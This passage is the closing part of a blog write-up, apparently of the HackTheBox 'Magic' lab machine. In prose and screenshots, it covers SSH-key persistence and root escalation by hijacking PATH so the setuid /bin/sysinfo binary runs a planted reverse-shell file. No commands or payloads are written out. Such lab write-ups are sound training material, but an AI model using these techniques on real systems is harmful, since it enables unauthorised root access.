data-src="/assets/img/magic/HTB-Images-Magic-lateral_movement_theseus.png" alt="Desktop View" /></p><h3 id="flag-user">Flag user</h3><hr /><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/magic/HTB-Images-Magic-flag_user.png" alt="Desktop View" /></p><h2 id="4-privilege-escalation---gain-higher-level-permissions"><strong><span style="color:#c0392b">[4] Privilege Escalation - Gain higher-level permissions</span></strong></h2><h3 id="persistence-with-ssh-authorized-keys">Persistence with SSH Authorized Keys</h3><hr /><p>To proceed more easily, I make my ssh connection more persistent.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/magic/HTB-Images-Magic-make_ssh_persistent.png" alt="Desktop View" /></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/magic/HTB-Images-Magic-connect_ssh_theseus.png" alt="Desktop View" /></p><h3 id="setuid-path-modification-and-reverse-shell-with-payload-injection">Setuid, Path Modification and Reverse Shell with Payload Injection</h3><hr /><p>The enumeration reveal interesting binary <code class="language-plaintext highlighter-rouge">/bin/sysinfo</code>. The program run under root privilege but he can be launch by anybody from users group. Our account belongs to this group.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/magic/HTB-Images-Magic-suid.png" alt="Desktop View" /></p><p>This program launch many module like <code class="language-plaintext highlighter-rouge">fdisk</code>, <code class="language-plaintext highlighter-rouge">cpuinfo</code> or <code class="language-plaintext highlighter-rouge">lshw</code>.</p><p>We using path variable to escalate our privilege by creating a named file of one of these modules with our bash reverse shell.</p><p>We modify an environment variable in order to make one of the modules run using the following path : <code class="language-plaintext highlighter-rouge">/tmp/privuser/</code></p><p>References - path environment : <a href="https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/">https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/</a></p><p>We listening on our local machine and execute sysinfo program on Magic machine.</p><h3 id="flag-root">Flag root</h3><hr /><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/magic/HTB-Images-Magic-flag_root.png" alt="Desktop View" /></p><p>Magic machine is compromised.</p><hr /><h2 id="trophy"><strong><center>Trophy</center></strong></h2><blockquote><p><strong>Any sufficiently advanced technology is indistinguishable from magic.</strong></p><p>Arthur C. Clarke</p></blockquote></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>HackTheBox</a>, <a href='/categories/boot2root/'>Boot2Root</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/linux/" class="post-tag no-text-decoration" >LINUX</a> <a href="/tags/medium/" class="post-tag no-text-decoration" >MEDIUM</a> <a href="/tags/enumeration/" class="post-tag no-text-decoration" >ENUMERATION</a> <a href="/tags/database-exploitation/" class="post-tag no-text-decoration" >DATABASE EXPLOITATION</a> <a href="/tags/sql-injection/" class="post-tag no-text-decoration" >SQL INJECTION</a> <a href="/tags/suid-binaries/" class="post-tag no-text-decoration" >SUID BINARIES</a> <a href="/tags/path-environment-exploitation/" class="post-tag no-text-decoration" >PATH-ENVIRONMENT EXPLOITATION</a> <a href="/tags/payload/" class="post-tag no-text-decoration" >PAYLOAD</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><!-- Post sharing snippet v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Write-up Magic Machine - PCW3R&url=https://pcw3r.github.io/posts/HTB-14-Pentest-Magic/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Write-up Magic Machine - PCW3R&u=https://pcw3r.github.io/posts/HTB-14-Pentest-Magic/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Write-up Magic Machine - PCW3R&url=https://pcw3r.github.io/posts/HTB-14-Pentest-Magic/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><!-- The Pannel on right side (Desktop views) v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"><h3 data-toc-skip>Recent Update</h3><ul class="post-content pl-0 pb-1 ml-1 mt-2"></ul></div><div id="access-tags"><h3 data-toc-skip>Trending Tags</h3><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/linux/">LINUX</a> <a class="post-tag" href="/tags/web-exploitation/">WEB EXPLOITATION</a> <a class="post-tag" href="/tags/payload/">PAYLOAD</a> <a class="post-tag" href="/tags/password-cracking/">PASSWORD CRACKING</a> <a class="post-tag" href="/tags/medium/">MEDIUM</a> <a class="post-tag" href="/tags/database-exploitation/">DATABASE EXPLOITATION</a> <a class="post-tag" href="/tags/active-directory-exploitation/">ACTIVE DIRECTORY EXPLOITATION</a> <a class="post-tag" href="/tags/cve/">CVE</a> <a class="post-tag" href="/tags/sudo-exploitation/">SUDO EXPLOITATION</a> <a class="post-tag" href="/tags/password-decrypt/">PASSWORD DECRYPT</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><h3 data-toc-skip class="pl-3 pt-2 mb-2">Contents</h3><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="post-extend-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <!-- Navigation buttons at the bottom of the post. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --><div class="post-navigation d-flex justify-content-between"> <a href="/posts/HTB-13-Pentest-Traceback/" class="btn btn-outline-primary"><p>Write-up Traceback Machine</p></a> <a href="/posts/HTB-15-Pentest-Remote/" class="btn btn-outline-primary"><p>Write-up Remote Machine</p></a></div><!-- Recommend the other 3 posts according to the tags and categories of the current post, if the number is not enough, use the other latest posts to supplement. v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/HTB-10-Pentest-Book/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Jul 10, 2020 <i class="unloaded">2020-07-10T04:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Write-up Book Machine</h3><div class="text-muted small"><p> Ref°: HTB-10-Boot2Root — Book is a Linux machine that highlights SQL truncation to bypass admin password and the execution of xss attack in PDF to read and recover passwd file and id_rsa of read...</p></div></div></a></div><div class="card"> <a href="/posts/HTB-04-Pentest-Mango/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Apr 18, 2020 <i class="unloaded">2020-04-18T05:33:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Write-up Mango Machine</h3><div class="text-muted small"><p> Ref°: HTB-04-Boot2Root — Mango is a Linux machine that highlights web enumeration through a certificate and NoSQL injection on unsecure login page, to discover credentials in MongoDB database wi...</p></div></div></a></div><div class="card"> <a href="/posts/HTB-16-Pentest-Admirer/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Sep 26, 2020 <i class="unloaded">2020-09-26T11:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Write-up Admirer Machine</h3><div class="text-muted small"><p> Ref°: HTB-16-Boot2Root ![Desktop View]({{ “/assets/img/admirer/HTB-Badge-Admirer.png” relative_url }}) — Admirer is a vulnerable machine through web and database exp...</p></div></div></a></div></div></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script> <!-- The Footer v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2021 <a href="https://twitter.com/pcw3r">pcw3r</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy/">Chirpy</a> theme.</p></div></div></footer></div><!-- The Search results v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/linux/">LINUX</a> <a class="post-tag" href="/tags/web-exploitation/">WEB EXPLOITATION</a> <a class="post-tag" href="/tags/payload/">PAYLOAD</a> <a class="post-tag" href="/tags/password-cracking/">PASSWORD CRACKING</a> <a class="post-tag" href="/tags/medium/">MEDIUM</a> <a class="post-tag" href="/tags/database-exploitation/">DATABASE EXPLOITATION</a> <a class="post-tag" href="/tags/active-directory-exploitation/">ACTIVE DIRECTORY EXPLOITATION</a> <a class="post-tag" href="/tags/cve/">CVE</a> <a class="post-tag" href="/tags/sudo-exploitation/">SUDO EXPLOITATION</a> <a class="post-tag" href="/tags/password-decrypt/">PASSWORD DECRYPT</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <!-- The GA snippet v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --> <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','https://www.google-analytics.com/analytics.js','ga'); ga('create', '', 'auto'); ga('send', 'pageview'); </script> <!-- Jekyll Simple Search loader v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://pcw3r.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
